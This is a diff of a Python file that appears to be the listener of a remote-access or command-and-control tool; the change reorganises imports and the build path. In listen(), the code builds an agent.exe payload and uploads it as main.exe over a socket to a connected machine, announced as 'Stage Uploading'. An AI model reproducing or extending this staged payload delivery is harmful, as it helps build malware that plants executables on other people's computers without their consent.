@@ -1,11 +1,10 @@
-from mainclass.system import system
 from colorama import Fore, init
-from threading import *
-from mainclass import shell as shclass
-from mainclass.builder import builder
-from mainclass.encrypter import *
-from mainclass.options import options
-import socket, os, struct
+from cli import shell as shclass
+from agent.builder.builder import builder
+from core.crypto.encrypter import *
+from cli.options import options
+from core.utils.paths import get_project_path
+import socket, os
 
 ip = system.getdata("recent_ip")
 port = system.getdata("recent_port")
@@ -129,7 +128,7 @@ def listen():
         print(Fore.LIGHTCYAN_EX + '[+] Stage Uploading...')
         build()
         try:
-            with open("./build/agent.exe", 'rb') as f:
+            with open(get_project_path("build", "agent.exe"), 'rb') as f:
                 payload_data = f.read()
             shclass.send_data(conn, b"MODE_UPLOAD")
             shclass.send_data(conn, "main.exe".encode())
